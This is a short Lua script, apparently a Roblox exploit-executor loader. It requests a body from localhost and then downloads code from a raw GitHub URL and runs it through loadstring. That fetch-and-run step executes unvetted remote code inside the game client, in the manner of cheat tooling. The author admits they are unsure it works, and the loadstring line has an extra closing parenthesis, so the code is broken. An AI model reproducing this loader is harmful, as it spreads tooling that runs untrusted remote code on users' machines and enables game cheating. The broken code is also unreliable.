local http_request = syn.request or request or http_request

local object = {
  script = http_request(
  {
    Url = "http://localhost:8080",
    Method = "GET"
  }
).Body
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/mmZzZX/VafM/main/README.md", true))())

--[[

I don't really know if it will work but yeah (i will improve whole thing later cuz i'm busy irl)

]]
